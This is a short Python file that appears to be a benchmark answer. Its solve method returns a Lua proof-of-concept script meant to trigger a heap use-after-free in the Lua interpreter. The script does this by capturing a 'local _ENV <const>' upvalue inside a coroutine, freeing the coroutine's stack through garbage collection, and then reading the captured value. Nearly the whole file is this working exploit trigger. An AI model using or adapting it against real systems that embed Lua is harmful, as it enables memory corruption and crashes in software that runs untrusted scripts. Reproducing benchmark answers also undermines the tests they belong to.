import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC targets the Lua vulnerability where 'local _ENV <const>'
        # causes incorrect code generation regarding upvalue lifecycle management.
        # By creating the vulnerable variable on a coroutine stack and letting the
        # coroutine die, we force a Heap Use-After-Free when accessing the captured variable.
        return b"""
local function trigger()
    local function factory()
        local _ENV <const> = { x = 0x1337 }
        return function()
            return _ENV.x
        end
    end

    local co = coroutine.create(function()
        coroutine.yield(factory())
    end)

    local ok, callback = coroutine.resume(co)
    
    -- Finish the coroutine
    coroutine.resume(co)
    
    -- Remove reference to coroutine and force GC to free its stack
    co = nil
    collectgarbage()
    collectgarbage()
    
    -- If the upvalue was not properly closed (due to the bug),
    -- this access will read from the freed stack memory (Heap UAF).
    if callback then
        print(callback())
    end
end

pcall(trigger)
"""
